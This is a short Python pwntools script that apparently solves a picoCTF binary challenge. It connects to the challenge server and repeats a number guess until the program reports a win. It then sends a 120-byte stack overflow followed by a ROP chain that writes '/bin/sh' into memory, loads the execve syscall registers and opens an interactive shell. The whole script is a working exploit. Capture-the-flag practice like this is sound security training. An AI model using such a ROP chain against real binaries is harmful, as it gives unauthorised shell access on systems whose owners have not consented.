from pwn import *

#r = process("./vuln")
r = remote("jupiter.challenges.picoctf.org" , 26731)
poprdi = 0x0000000000400696
rax = 0x00000000004163f4
rdi = 0x0000000000436393
rsi = 0x0000000000410ca3
rdx = 0x000000000044a6b5
syscall = 0x000000000040137c
while True:
    print r.sendlineafter("What number would you like to guess?\n","23")
    s = r.recvline()
    print(s)
    if "win" not in s:
        log.info("Fail!")
        continue
    else:
        payload = "a"*120
        payload += p64(poprdi)
        payload += p64(0x00000000006bd500)
        payload += p64(rdx)
        payload += "/bin/sh\x00"
        payload += p64(rdi)
        payload += p64(rdx)
        payload += p64(0x0)
        payload += p64(rsi)
        payload += p64(0x0)
        payload += p64(rax)
        payload += p64(0x3b)
        payload += p64(syscall)
        #gdb.attach(r)
        print r.sendlineafter("Name? ", payload)
        r.interactive()
